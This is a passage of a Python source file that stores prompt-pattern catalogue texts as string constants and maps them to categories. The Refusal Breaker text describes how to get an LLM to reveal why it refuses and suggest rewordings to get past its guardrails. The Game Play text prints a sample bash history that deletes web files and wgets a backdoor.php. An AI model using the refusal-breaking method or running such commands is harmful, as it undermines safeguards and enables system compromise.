you give a more accurate answer. When I have answered the three questions, combine the answers to produce the final answers to my original question.\"\n\nThis specific instance of the prompt pattern adds a refinement to the original pattern by specifying a set number of additional questions that the LLM should generate in response to a question. In this case, the prompt specifies that ChatGPT should generate three additional questions that would help to give a more accurate answer to the original question. The specific number can be based on the user's experience and willingness to provide follow-up information. A refinement to the prompt can be to provide a context for the amount of knowledge that the LLM can assume the user has in the domain to guide the creation of the additional questions:\n\n\"When I ask you a question, generate three additional questions that would help you give a more accurate answer. Assume that I know little about the topic that we are discussing and please define any terms that are not general knowledge. When I have answered the three questions, combine the answers to produce the final answers to my original question.\"\n\nThe refinement also specifies that the user may not have a strong understanding of the topic being discussed, which means that the LLM should define any terms that are not general knowledge. This helps to ensure that the follow-up questions are not only relevant and focused, but also accessible to the user, who may not be familiar with technical or domain-specific terms. By providing clear and concise definitions, the LLM can help to ensure that the follow-up questions are easy to understand and answer.\n\n5) Consequences: This pattern can dictate the exact number of questions to generate or leave this decision to the LLM. There are pros and cons to dictating the exact number. A pro is that specifying an exact number of questions can tightly scope the amount of additional information the user is forced to provide so it is within a range they are willing and able to contribute.\n\nA con, however, is that given N questions there may be an invaluable N + 1 question that will always be scoped out. Alternatively, the LLM can be provided a range or allowed to ask additional questions. Of course, by omitting a limit on the number of questions the LLM may generate numerous additional questions that overwhelm the user."
REFUSAL_BREAKER_CONTEXT = "1) Intent and Context: The goal of this pattern is to ask an LLM to automatically help users rephrase a question when it refuses to give an answer. This pattern has the potential for misuse, however, e.g., to generate phishing emails or perform other actions that violate LLM policy filters. Caution should therefore be exercised when applying this pattern to ensure it is used ethically and responsibly. This pattern has been used successfully in some LLMs to overcome the underlying prompts used to program the LLM and prevent harmful output generation.\n\n2) Motivation: LLMs may sometimes refuse to answer a question, either because they do not have the required knowledge or because the question is phrased in a way that they do not understand. This outcome may be frustrating for users who are looking for answers. In some situations, therefore, the Refusal Breaker pattern can help users find a way to either rephrase their question or ask a different question the LLM is better equipped to answer.\n\nFor example, you could ask for clarification on why the question was refused, as there may be a specific reason why LLM could not provide an answer. Another approach is to ask a different question that may be within its knowledge cut-off or expertise. However, all these approaches require user intervention and knowledge of how to bypass the refusal.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                   |\n| :------------------------------------------------------------------------------------------------------ |\n| Whenever you can't answer a question                                                                     |\n| Explain why you can't answer the question                                                                |\n| Provide one or more alternative wordings of the question that you could answer                           |\n\nThe first statement sets the stage that this set of instructions should only be applied when a question can't be answered. The user does not want to trigger these instructions under normal circumstances. The second statement instructs the LLM to provide an explanation of why the question can't be answered. The explanation is likely to include assumptions, constraints, or misunderstandings that can be leveraged by the user to strategize about how to reword the question. Although just the explanation of why the question can't be answered could help a user overcome the refusal, the pattern adds an additional statement for the LLM to suggest rewordings that would be acceptable. The pattern combines both reasoning and suggested rewordings to improve the chances that the user will find a path around whatever roadblocks are preventing the question form being answered.\n\n4) Example Implementation: The Refusal Breaker pattern can be implemented and applied with the following phrasing:\n\n\"Whenever you can't answer a question, explain why and provide one or more alternate wordings of the question that you can't answer so that I can improve my questions.\"\n\nA sample discourse after using the pattern is shown below:\n\nUser: What is the meaning of life?\n\nChatGPT: As an AI language model, I do not have personal beliefs or opinions. The meaning of life is a complex philosophical question that has been pondered by humans for centuries and can vary greatly from person to person. It may be more productive to rephrase the question in a way that can be answered by information and knowledge, such as \"What are some philosophical perspectives on the meaning of life?\" or \"What are some common beliefs about the purpose of life?\"\n\n5) Consequences: This pattern provides a potential path for misuse, so organizations, parents, or other stakeholders may need to restrict the usage of the LLM. The first step in going around guardrails on usage is to understand where the guardrails are. In future work, a complement of this pattern may be developed to hide the underlying prompt information and rationale from users to prevent discovery.\n\nAlthough the rationale and alternate rewordings are generated, there is no guarantee that users will be able to overcome the refusal. The alternate questions that are generated may not be of interest to the user or helpful in answering the original question. The pattern mainly provides an aid in determining what the LLM can answer, but not a guarantee that it will answer a semantically equivalent variation of the original question."
FLIPPED_INTERACTION_CONTEXT = "1) Intent and Context: You want the LLM to ask questions to obtain the information it needs to perform some tasks. Rather than the user driving the conversation, therefore, you want the LLM to drive the conversation to focus it on achieving a specific goal. For example, you may want the LLM to give you a quick quiz or automatically ask questions until it has sufficient information to generate a deployment script for your application to a particular cloud environment.\n\n2) Motivation: Rather than having the user drive a conversation, an LLM often has knowledge it can use to more accurately obtain information from the user. The goal of the Flipped Interaction pattern is to flip the interaction flow so the LLM asks the user questions to achieve some desired goal. The LLM can often better select the format, number, and content of the interactions to ensure that the goal is reached faster, more accurately, and/or by using knowledge the user may not (initially) possess.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                                                                          |\n| :------------------------------------------------------------------------------------------------------------- |\n| I would like you to ask me questions to achieve X                                                              |\n| You should ask questions until this condition is met or to achieve this goal (alternatively, forever)         |\n| (Optional) ask me the questions one at a time, two at a time, etc.                                             |\n\nA prompt for a flipped interaction should always specify the goal of the interaction. The first idea (i.e., you want the LLM to ask questions to achieve a goal) communicates this goal to the LLM. Equally important is that the questions should focus on a particular topic or outcome. By providing the goal, the LLM can understand what it is trying to accomplish through the interaction and tailor its questions accordingly. This \"inversion of control\" enables more focused and efficient interaction since the LLM will only ask questions that it deems relevant to achieving the specified goal.\n\nThe second idea provides the context for how long the interaction should occur. A flipped interaction can be terminated with a response like \"stop asking questions\". It is often better, however, to scope the interaction to a reasonable length or only as far as is needed to reach the goal. This goal can be surprisingly open-ended and the LLM will continue to work towards the goal by asking questions, as is the case in the example of \"until you have enough information to generate a Python script\".\n\nBy default, the LLM is likely to generate multiple questions per iteration. The third idea is completely optional, but can improve usability by limiting (or expanding) the number of questions that the LLM generates per cycle. If a precise number/format for the questioning is not specified, the questioning will be semi-random and may lead to one-at-a-time questions or ten-at-a-time questions. The prompt can thus be tailored to include the number of questions asked at a time, the order of the questions, and any other formatting/ordering considerations to facilitate user interaction.\n\n4) Example Implementation: A sample prompt for a flipped interaction is shown below:\n\n\"From now on, I would like you to ask me questions to deploy a Python application to AWS. When you have enough information to deploy the application, create a Python script to automate the deployment.\"\n\nIn general, the more specific the prompt regarding the constraints and information to collect, the better the outcome. For instance, the example prompt above could provide a menu of possible AWS services (such as Lambda, EC2, etc.) with which to deploy the application. In other cases, the LLM may be permitted to simply make appropriate choices on its own for things that the user doesn't explicitly make decisions about.\n\nOne limitation of this prompt is that, once other contextual information is provided regarding the task, it may require experimentation with the precise phrasing to get the LLM to ask the questions in the appropriate number and flow to best suit the task, such as asking multiple questions at once versus one question at a time.\n\n5) Consequences: One consideration when designing the prompt is how much to dictate to the LLM regarding what information to collect prior to termination. In the example above, the flipped interaction is open-ended and can vary significantly in the final generated artifact. This open-endedness makes the prompt generic and reusable, but may potentially ask additional questions that could be skipped if more context is given.\n\nIf specific requirements are known in advance, it is better to inject them into the prompt rather than hoping the LLM will obtain the needed information. Otherwise, the LLM will nondeterministically decide whether to prompt the user for the information or make an educated guess as to an appropriate value.\n\nFor example, the user can state that they would like to deploy an application to Amazon AWS EC2, rather than simply state \"the cloud\" and require multiple interactions to narrow down the deployment target. The more precise the initial information, the better the LLM can use the limited questions that a user is likely willing to answer to obtain information to improve its output.\n\nWhen developing prompts for flipped interactions, it is important to consider the level of user knowledge, engagement, and control. If the goal is to accomplish the goal with as little user interaction as possible (minimal control), that should be stated explicitly. Conversely, if the goal is to ensure the user is aware of all key decisions and confirms them (maximum engagement) that should also be stated explicitly. Likewise, if the user is expected to have minimal knowledge and should have the questions targeted at their level of expertise, this information should be engineered into the prompt."
GAME_PLAY_CONTEXT = "1) Intent and Context: The intent of this pattern is to create a game around a given topic. The pattern can be combined with the Visualization Generator to add imagery to the game. The game is centered around a specific topic and the LLM will guide the game play. The pattern is particularly effective when the rules of the game are relatively limited in scope, but the content for the game is expected to be wide in scope. The user can specify a limited set of rules and then the LLM can automate generation of bodies of content for game play.\n\n2) Motivation: You would like the LLM to generate scenarios or questions revolving around a specific topic and require users to apply problem solving or other skills to accomplish a task related to the scenario. Generating all the content for the game manually would be too time consuming, however, so you would like the LLM to apply its knowledge of the topic to guide the generation of content.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                                |\n| :--------------------------------------------------- |\n| Create a game for me around X                        |\n| One or more fundamental rules of the game            |\n\nThe first statement instructs the LLM to create a game and provides the important scoping of the game to a topic area. One of the important capabilities of the pattern is that it allows the user to create games by describing the rules of the game without having to determine the content of the game. The more specific the topic, typically the more novel and interesting the game play.\n\nThe second statement introduces the rules of the game to the LLM. It is important that the rules fit within the capabilities of the LLM. Textual games that rely on input and output text sequences work best. One of the key attributes of the pattern is that the input text can be rich and expressive, which can lead to interesting interfaces for the game. For example, the user might express actions in the game as scripts dictating a sequence of complex actions, such as \"get a listing of all network activity and check it for anomalies\", which go beyond the scope of multiple choice or short answer inputs. Each rule should be provided as a separate statement regarding some aspect of the game.\n\n4) Example Implementation: A sample cybersecurity game prompt is shown below:\n\"We are going to play a cybersecurity game. You are going to pretend to be a Linux terminal for a computer that has been compromised by an attacker. When I type in a command, you are going to output the corresponding text that the Linux terminal would produce. I am going to use commands to try and figure out how the system was compromised. The attack should have done one or more of the following things: (1) launched new processes, (2) changed files, (3) opened new ports to receive communication, (4) created new outbound connections, (5) changed passwords, (6) created new user accounts, or (7) read and stolen information. To start the game, print a scenario of what happened that led to my investigation and make the description have clues that I can use to get started.\"\nThis cybersecurity game prompt combines a number of patterns, including Game Play and Persona. The Linux terminal persona that is chosen for the game has been discussed in many Internet posts. This game further customizes the discussed Linux persona to act as a Linux terminal of a computer compromised by a cyberattack. ChatGPT responds to Linux commands with appropriate terminal outputs and synthesizes a fake file system that has clues to a cyberattack.\nSample output from this game with ChatGPT after typing in \"ls -alt\", the Linux command to generate a list of files in the current directory is shown below (permissions have been removed for formatting reasons):\ntotal 56\n5 user user 4096 Feb 16 14:31 .\n1 user user 18881 Feb 16 14:31 .bash_history\n43 user user 4096 Feb 16 14:30 ..\n1 user user 1178 Aug 15 2022 .bashrc\n1 user user 220 Aug 15 2022 .bash_logout\n3 user user 4096 Feb 16 14:25 .gnupg\n1 user user 4041 Feb 15 17:52 README.md\n2 user user 4096 Feb 1 11:35 project\nWhen the user then typed the command \"cat .bash history\", to display the contents of the log file showing the commands run by the user, ChatGPT responded with:\ncd /var/www/html\nsudo rm -rf *\nsudo wget https://example.com/backdoor.php\nsudo chmod 777 backdoor.php\nexit\nls -alt\nps -ef\nnetstat -tulnp\nIn the output above, ChatGPT generated a fake log file with realistic commands for deleting the data being served by the web server in /var/www/html and replacing the content with a backdoor into the system.\n\n5) Consequences: This pattern can be combined effectively with the Persona, Infinite Generation, and Visualization Generator patterns. For example, the cybersecurity game uses the Persona pattern so the LLM can masquerade as a Linux terminal. For a network security game, the Visualization Generator could be employed to add the ability to visualize the network topology and traffic flows."
INFINITE_GENERATION_CONTEXT = "1) Intent and Context: The intent of this pattern is to automatically generate a series of outputs (which may appear infinite) without having to reenter the generator prompt each time. The goal is to limit how much text the user must type to produce the next output, based on the assumption that the user does not want to continually reintroduce the prompt. In some variations, the intent is to allow the user to keep an initial prompt template, but add additional variation to it through additional inputs prior to each generated output.\n\n2) Motivation: Many tasks require repetitive application of the same prompt to multiple concepts. For example, generating code for create, read, update, and delete (CRUD) operations for a specific type of entity may require applying the same prompt to multiple types of entities. If the user is forced to retype the prompt over and over, they may make mistakes. The Infinite Generation pattern allows the user to repetitively apply a prompt, either with or without further input, to automate the generation of multiple outputs using a predefined set of constraints.\n\n3) Structure and Key Ideas:\n\n| Contextual Statements                                                                           |\n| :---------------------------------------------------------------------------------------------- |\n| I would like you to generate output forever, X output(s) at a time.                             |\n| (Optional) here is how to use the input I provide between outputs.                              |\n| (Optional) stop when I ask you to.                                                              |\n\nThe first statement specifies that the user wants the LLM to generate output indefinitely, which effectively conveys the information that the same prompt is going to be reused over and over. By specifying the number of outputs that should be generated at a time (i.e. \"X outputs at a time\"), the user can rate limit the generation, which can be particularly important if there is a risk that the output will exceed the length limitations of the LLM for a single output.\n\nThe second statement provides optional instructions for how to use the input provided by the user between outputs. By specifying how additional user inputs between prompts can be provided and leveraged, the user can create a prompting strategy that leverages user feedback in the context of the original prompt. The original prompt is still in the context of the generation, but each user input between generation steps is incorporated into the original prompt to refine the output using prescribed rules.\n\nThe third statement provides an optional way for the user to stop the output generation process. This step is not always needed, but can be useful in situations where there may be the potential for ambiguity regarding whether or not the user-provided input between inputs is meant as a refinement for the next generation or a command to stop. For example, an explicit stop phrase could be created if the user was generating data related to road signs, where the user might want to enter a refinement of the generation like \"stop\" to indicate that a stop sign should be added to the output.\n\n4) Example Implementation: The following is a sample infinite generation prompt for producing a series of URLs:\n\n\"From now on, I want you to generate a name and job until I say stop. I am going to provide a template for your output. Everything in all caps is a placeholder. Any time that you generate text, try to fit it into one of the placeholders that I list. Please preserve the formatting and overall template that I provide: https://myapi.com/NAME/profile/JOB\"\n\nThis prompt is combining the functionality of both the Infinite Generation pattern and the Template pattern. The user is requesting the LLM continuously generate a name and job title until explicitly told to \"stop\". The generated outputs are then formatted into the template provided, which includes placeholders for the name and job title. By using the Infinite Generation pattern, the user receives multiple outputs without having to continually re-enter the template. Likewise, the Template pattern is applied to provide a consistent format for the outputs.\n\n5) Consequences: In conversational LLMs, the input to the model at each time step is the previous output and the new user input. Although the details of what is preserved and reintroduced in the next output cycle are model and implementation dependent, they are often limited in scope. The model is therefore constantly being fed the previous outputs and the prompt, which can result in the model losing track of the original prompt instructions over time if they exceed the scope of what it is being provided as input.\n\nAs additional outputs are generated, the context surrounding the prompt may fade, leading to the model deviating from the intended behavior. It is important to monitor the outputs produced by the model to (1) ensure it still adheres to the desired behavior and (2) provide corrective feedback if necessary. Another issue to consider is that the LLM may generate repetitive outputs, which may not be desired since users find this repetition tedious and error-prone to process."
CONTEXT_MANAGER_CONTEXT = "1) Intent and Context: The intent of this pattern is to enable users to specify or remove context for a conversation with an LLM. The goal is to focus the conversation on specific topics or exclude unrelated topics from consideration. This pattern gives users greater control over what statements the LLM considers or ignores when generating output.\n\n2) Motivation: LLMs often struggle to interpret the intended context of the current question or generate irrelevant responses based on prior inputs or irrelevant attention on the wrong statements. By focusing on explicit contextual statements or removing irrelevant statements, users can help the LLM better understand the question and generate more accurate responses. Users may introduce unrelated topics or reference information from earlier in the dialogue, which may can disrupt the flow of the conversation. The Context Manager pattern aims to emphasize or remove specific aspects of the context to maintain relevance and coherence in the conversation.\n\n3) Structure and Key Ideas: Fundamental contextual statements:\n\n| Contextual Statements                    |\n| :--------------------------------------- |\n| Within scope X                           |\n| Please consider Y                        |\n| Please ignore Z                          |\n| (Optional) start over                    |\n\nStatements about what to consider or ignore should list key concepts, facts, instructions, etc. that should be included or removed from the context. The more explicit the statements are, the more likely the LLM will take appropriate action. For example, if the user asks to ignore subjects related to a topic, yet some of those statements were discussed far back in the conversation, the LLM may not properly disregard the relevant information. The more explicit the list is, therefore, the better the inclusion/exclusion behavior will be.\n\n4) Example Implementation: To specify context consider using the following prompt:\n\"When analyzing the following pieces of code, only consider security aspects.\"\nLikewise, to remove context consider using the following prompt:\n\"When analyzing the following pieces of code, do not consider formatting or naming conventions.\"\n\nClarity and specificity are important when providing or removing context to/from an LLM so it can better understand the intended scope of the conversation and generate more relevant responses. In many situations, the user may want to completely start over and can employ this prompt to reset the LLM's context:\n\"Ignore everything that we have discussed. Start over.\"\n\nThe \"start over\" idea helps produce a complete reset of the context.\n\n5) Consequences: One consequence of this pattern is that it may inadvertently wipe out patterns applied to the conversation that the user is unaware of. For example, if an organization injects a series of helpful patterns into the start of a conversation, the user may not be aware of these patterns and remove them through a reset of the context. This reset could potentially eliminate helpful capabilities of the LLM, while not making it obvious that the user will lose this functionality. A potential solution to this problem is to include in the prompt a request to explain what topics/instructions will potentially be lost before proceeding."

###############################
# Section 3 - Mapping Relations
###############################

CATEGORY_TO_PATTERNS = {
    Category.INPUT_SEMANTICS.value: [
        Pattern.META_LANGUAGE_CREATION.value,
    ],
    Category.OUTPUT_CUSTOMIZATION.value: [
        Pattern.OUTPUT_AUTOMATER.value,
        Pattern.PERSONA.value,
        Pattern.VISUALIZATION_GENERATOR.value,
        Pattern.RECIPE.value,
        Pattern.TEMPLATE.value,
    ],
    Category.ERROR_IDENTIFICATION.value: [
        Pattern.FACT_CHECK_LIST.value,
        Pattern.REFLECTION.value,
    ],
    Category.PROMPT_IMPROVEMENT.value: [
        Pattern.QUESTION_REFINEMENT.value,
        Pattern.ALTERNATIVE_APPROACHES.value,
        Pattern.COGNITIVE_VERIFIER.value,
        Pattern.REFUSAL_BREAKER.value,
    ],
    Category.INTERACTION.value: [
        Pattern.FLIPPED_INTERACTION.value,
        Pattern.GAME_PLAY.value,
        Pattern.INFINITE_GENERATION.value,
    ],
    Category.CONTEXT_CONTROL.value: [
        Pattern.CONTEXT_MANAGER.value,
    ]
}

PATTERN_TO_CONTEXT = {
    Pattern.META_LANGUAGE_CREATION.value: META_LANGUAGE_CREATION_CONTEXT,
    Pattern.OUTPUT_AUTOMATER.value: OUTPUT_AUTOMATER_CONTEXT,
    Pattern.PERSONA.value: PERSONA_CONTEXT,
    Pattern.VISUALIZATION_GENERATOR.value: VISUALIZATION_GENERATOR_CONTEXT,
    Pattern.RECIPE.value: RECIPE_CONTEXT,
    Pattern.TEMPLATE.value: TEMPLATE_CONTEXT,
    Pattern.FACT_CHECK_LIST.value: FACT_CHECK_LIST_CONTEXT,
    Pattern.REFLECTION.value: REFLECTION_CONTEXT,
    Pattern.QUESTION_REFINEMENT.value: QUESTION_REFINEMENT_CONTEXT,
    Pattern.ALTERNATIVE_APPROACHES.value: ALTERNATIVE_APPROACHES_CONTEXT,
    Pattern.COGNITIVE_VERIFIER.value: COGNITIVE_VERIFIER_CONTEXT,
    Pattern.REFUSAL_BREAKER.value: REFUSAL_BREAKER_CONTEXT,
    Pattern.FLIPPED_INTERACTION.value: FLIPPED_INTERACTION_CONTEXT,
    Pattern.GAME_PLAY.value: GAME_PLAY_CONTEXT,
    Pattern.INFINITE_GENERATION.value: INFINITE_GENERATION_CONTEXT,
    Pattern.CONTEXT_MANAGER.value: CONTEXT_MANAGER_CONTEXT,
}